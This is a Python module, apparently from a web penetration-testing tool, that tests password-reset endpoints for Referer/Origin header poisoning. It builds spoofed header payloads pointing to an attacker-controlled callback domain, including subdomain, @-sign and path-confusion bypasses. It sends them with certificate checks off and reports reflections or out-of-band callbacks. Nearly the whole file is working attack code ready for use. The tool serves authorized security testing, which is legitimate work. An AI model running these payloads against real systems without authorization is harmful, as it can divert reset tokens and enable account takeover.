#!/usr/bin/env python3
import sys
sys.dont_write_bytecode = True

from utils.style import Colors
from utils.utils import requests, human_time, get_domain_from_url, CANARY
from utils import live


def _build_payloads(attacker_domain, original_host):
    """
    Build Referer/Origin injection payloads.
    Host header stays legitimate — only Referer/Origin is attacker-controlled.
    """
    return [
        {"Referer": f"https://{attacker_domain}/"},
        {"Referer": f"https://{attacker_domain}/reset-password"},
        {"Origin": f"https://{attacker_domain}"},
        {"Referer": f"https://{attacker_domain}/", "Origin": f"https://{attacker_domain}"},
        # Partial bypass: attacker as subdomain of victim
        {"Referer": f"https://{attacker_domain}.{original_host}/"},
        # Partial bypass: victim embedded in attacker path
        {"Referer": f"https://{original_host}.{attacker_domain}/"},
        # @-trick: looks like victim but resolves to attacker
        {"Referer": f"https://{original_host}@{attacker_domain}/"},
        # Path confusion
        {"Referer": f"https://{original_host}/{attacker_domain}"},
    ]


def referrer_manipulation(url, human, parsed_req, baseline, interact, proxy=None):
    """
    Referer/Origin header manipulation to influence reset link destination.

    Unlike HHIP (Host changed), here Host is legitimate — only Referer/Origin is
    attacker-controlled. Detects servers that read Referer to build the reset link URL,
    which would send the token to the attacker's domain instead of the legitimate one.
    """
    print(f"{Colors.CYAN} ├ Referrer manipulation{Colors.RESET}")

    if not interact:
        print(f"  {Colors.YELLOW}[!] -i/--interact required for out-of-band detection{Colors.RESET}")
        return

    original_host = parsed_req["host"]
    method = parsed_req["method"]
    path = parsed_req["path"]
    body = parsed_req["body"]
    headers = dict(parsed_req["headers"])
    scheme = "https" if "https" in url else "http"

    uri = f"{scheme}://{original_host}{path}"
    proxies = {"http": proxy, "https": proxy} if proxy else None
    attacker_domain = get_domain_from_url(interact)

    payloads = _build_payloads(attacker_domain, original_host)

    print(f"{Colors.CYAN} └─ Referer/Origin injection ({len(payloads)} payloads, Host stays {original_host}){Colors.RESET}")

    for injected_headers in payloads:
        test_headers = headers.copy()
        test_headers.update(injected_headers)

        try:
            live.testing(f"referrer {injected_headers}")
            human_time(human)
            resp = requests.request(
                method=method, url=uri, headers=test_headers,
                data=body or None, verify=False, allow_redirects=False,
                timeout=10, proxies=proxies,
            )

            # Attacker domain reflected in response body
            if attacker_domain in resp.text:
                print(f"{Colors.RED}   └── [HIGH] {attacker_domain} reflected in body → Referer used to build reset URL{Colors.RESET}")
                print(f"{Colors.RED}       payload: {injected_headers}{Colors.RESET}")

            # Attacker domain in response headers (e.g. Location redirect)
            resp_headers_str = str(resp.headers)
            if attacker_domain in resp_headers_str:
                print(f"{Colors.RED}   └── [HIGH] {attacker_domain} in response headers{Colors.RESET}")
                print(f"{Colors.RED}       payload: {injected_headers}{Colors.RESET}")

            # Status anomaly
            if resp.status_code != baseline["status"] and resp.status_code not in [400, 403]:
                print(f"{Colors.YELLOW}   └── [{baseline['status']} > {resp.status_code}] payload: {injected_headers}{Colors.RESET}")

            # Out-of-band callback check
            try:
                check = requests.get(interact, verify=False, allow_redirects=False, timeout=5, proxies=proxies)
                if check.status_code == 200 and (attacker_domain in check.text or CANARY in check.text):
                    print(f"{Colors.RED}   └── [CRITICAL] OOB callback detected on {interact}{Colors.RESET}")
                    print(f"{Colors.RED}       Server fetched attacker domain embedded in Referer/Origin{Colors.RESET}")
                    print(f"{Colors.RED}       payload: {injected_headers}{Colors.RESET}")
            except requests.RequestException:
                pass

        except requests.RequestException:
            pass

    print(f"{Colors.CYAN}   └─ Done{Colors.RESET}")
